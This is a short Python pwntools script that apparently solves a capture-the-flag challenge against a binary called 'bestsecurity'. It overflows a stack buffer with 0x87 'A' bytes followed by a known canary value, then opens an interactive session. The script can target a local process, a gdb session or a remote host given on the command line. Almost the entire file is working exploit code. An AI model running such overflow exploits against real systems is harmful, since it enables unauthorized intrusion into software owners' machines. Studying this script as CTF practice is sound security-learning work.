from pwn import *


PROGRAM_PATH = (Path(__file__).parent / "bestsecurity").resolve().__str__()
BUFF_SIZE = 0x87
# BUFF_SIZE = 0x88
# CANARY = 123456789
CANARY = "3132333435363738"

gdb_script = """
b *main
b *check_canary
b *check_canary+69
b *check_canary+39

c
"""


# FullPath
print(f"Program path is: {PROGRAM_PATH}")
print("____________________________________")


# TODO: Add the ip address here later!
def start(argv=[], *a, **kwargs):
    if args.GDB:
        return gdb.debug([PROGRAM_PATH] + argv, gdbscript=gdb_script, *a, **kwargs)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kwargs)
    else:
        return process([PROGRAM_PATH] + argv, *a, **kwargs)


io = start()
res = io.recvlines(1)
print("____________________________________")
print(res)

le = p64(int(CANARY, 16), "little")
be = p64(int(CANARY, 16), endianness="big")
payload = b"A" * BUFF_SIZE + le
print(f"Sending payload: {payload}")

io.sendline(payload)
res = io.recvlines(1)
print(res)
io.interactive()
